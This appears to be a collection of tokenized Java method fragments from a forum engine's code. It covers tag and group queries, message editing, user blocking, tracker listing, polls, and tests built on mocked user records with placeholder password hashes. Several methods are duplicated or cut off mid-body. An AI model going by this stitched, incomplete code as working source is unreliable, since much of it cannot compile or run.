db , msgid , newTags ) ; if ( modifiedTags ) { editInfo . setOldtags ( TagDao . toString ( oldTags ) ) ; TagDao . updateCounters ( db , oldTags , newTags ) ; modified = true ; } } if ( modified ) { SimpleJdbcInsert insert = new SimpleJdbcInsert ( scds ) . withTableName ( " edit_info " ) . usingColumns ( " msgid " , " editor " , " oldmessage " , " oldtitle " , " oldtags " ) ; insert . execute ( new BeanPropertySqlParameterSource ( editInfo ) ) ; } return modified ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , TagDao . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public SortedSet < String > doInConnection ( Connection con ) throws SQLException , DataAccessException { return getTopTagsInternal ( con ) ; } 
public static SortedSet < String > getTopTags ( Connection con ) throws SQLException { return getTopTagsInternal ( con ) ; } 
private static SortedSet < String > getTopTagsInternal ( Connection con ) throws SQLException { SortedSet < String > set = new TreeSet < String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>1 ORDER BY counter DESC LIMIT " + TOP_TAGS_COUNT ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { set . add ( rs . getString ( " value " ) ) ; } return set ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionDao . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionDao . getAddInfo ( section . getId ( ) ) ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public static Group getGroup ( Connection db , int id ) throws BadGroupException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return GroupDao . getGroup ( jdbcTemplate , id ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionDao . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionDao . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , GroupDao . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " topTags " , TagDao . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public List < Group > doInConnection ( Connection con ) throws SQLException , DataAccessException { return getGroupsInternal ( con , section ) ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { return getGroupsInternal ( db , section ) ; } 
private static List < Group > getGroupsInternal ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, urlname, image, restrict_topics, restrict_comments, stat1,stat2,stat3,groups.id,groups.info,groups.longinfo,groups.resolvable FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; ImmutableList . Builder < Group > list = ImmutableList . builder ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list . build ( ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags ) { return prepareMessage ( message , tags , true ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags , boolean includeCut ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public void maxcomTest ( ) throws Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . canModerate ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) throws Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user5starTest ( ) throws Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) throws Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . canModerate ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public static ResultSet getAnonymous ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 2 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " anonymous " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( - 117654 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 4 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Anonymous " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 161 ) ; return resultSet ; } 
public static ResultSet getModerator ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 5280 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " svu " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Sergey V. Udaltsov " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " 0vwkMky44u8kIqSasrH+X8mHao1a3jOC " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( " 5280.png " ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 2 ) ; return resultSet ; } 
public static ResultSet getUser5star ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 13 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user5star " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 500 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 5 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser1star ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 14 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user1star " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 1 star " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45Score ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 15 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " user45score " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " 45 score " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public static ResultSet getUser45ScoreBlocked ( ) throws Exception { ResultSet resultSet ; resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 16 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " userBlocked " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( true ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 45 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " blocked " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 13 ) ; return resultSet ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public void changeScore ( int id , int delta ) { if ( jdbcTemplate . update ( queryChangeScore , delta , id ) = = 0 ) { throw new IllegalArgumentException ( new UserNotFoundException ( id ) ) ; } updateCache ( id ) ; } 
public void blockWithoutTransaction ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; updateCache ( user . getId ( ) ) ; } 
private void updateCache ( int id ) { try { getUser ( id ) ; 
public void blockWithResetPassword ( User user , User moderator , String reason ) { jdbcTemplate . update ( " UPDATE users SET blocked='t' WHERE id=? " , user . getId ( ) ) ; jdbcTemplate . update ( " INSERT INTO ban_info (userid, reason, ban_by) VALUES (?, ?, ?) " , user . getId ( ) , reason , moderator . getId ( ) ) ; PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; String password = encryptor . encryptPassword ( StringUtil . generatePassword ( ) ) ; jdbcTemplate . update ( " UPDATE users SET passwd=?, lostpwd = 'epoch' WHERE id=? " , password , user . getId ( ) ) ; updateCache ( user . getId ( ) ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String title ; boolean resolved , uncommited ; try { author = userDao . getUserCached ( resultSet . getInt ( " author " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; title = resultSet . getString ( " title " ) ; cid = resultSet . getInt ( " cid " ) ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public boolean isUncommited ( ) { return uncommited ; } 
public User mapRow ( ResultSet resultSet , int i ) throws SQLException { try { return getUser ( resultSet . getInt ( " id " ) ) ; 
public ModelAndView viewVote ( @RequestParam ( " vote " ) int voteid ) throws Exception { Poll poll = pollDao . getPoll ( voteid ) ; return new ModelAndView ( new RedirectView ( " /jump-message.jsp?msgid= " + poll . getTopicId ( ) ) ) ; } 
public void updateVotes ( final int voteId , final int votes [ ] , final User user ) throws BadVoteException { try { jdbcTemplate . queryForInt ( queryVotes , voteId , user . getId ( ) ) ; 
public Poll getPollByTopicId ( int topicId ) throws PollNotFoundException { return getPoll ( getPollId ( topicId ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( userDao . getUser ( tmpl . getCurrentUser ( ) . getId ( ) ) ) ) ; } mv . getModel ( ) . put ( " userInfoText " , userDao . getUserInfo ( user ) ) ; return mv ; } 
public UserInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { return new UserInfo ( resultSet ) ; } 
public BanInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { Timestamp date = resultSet . getTimestamp ( " bandate " ) ; String reason = resultSet . getString ( " reason " ) ; User moderator ; try { moderator = getUser ( resultSet . getInt ( " ban_by " ) ) ; } catch ( UserNotFoundException exception ) { throw new SQLException ( exception . getMessage ( ) ) ; } return new BanInfo ( date , reason , moderator ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . put ( resultSet . getString ( " pname " ) , resultSet . getInt ( " c " ) ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . put ( resultSet . getInt ( " ignored " ) , resultSet . getString ( " nick " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , userDao . getIgnoreList ( userDao . getUser ( tmpl . getCurrentUser ( ) . getId ( ) ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : HTMLFormatter . nl2br ( userinfo ) ) ; return mv ; } 
public List < Timestamp > mapRow ( ResultSet resultSet , int i ) throws SQLException { return ImmutableList . of ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public String tags ( ) throws Exception { return " tags " ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { builder . put ( resultSet . getString ( " value " ) , resultSet . getInt ( " counter " ) ) ; } 
public String oldTags ( ) throws Exception { return " redirect:/tags " ; } 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , final boolean readMessage ) { String queryString ; if ( showPrivate ) { queryString = queryAllRepliesForUser ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( updateResetUnreadReplies , user . getId ( ) ) ; } 
public List < Timestamp > mapRow ( ResultSet resultSet , int i ) throws SQLException { return Lists . newArrayList ( resultSet . getTimestamp ( " first " ) , resultSet . getTimestamp ( " last " ) ) ; } 
public void checkDuplication ( String ip , boolean trusted , Errors errors ) { if ( ! check ( ip , trusted ) ) { errors . reject ( null , MESSAGE ) ; 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . setOutputLorcode ( true ) ; if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
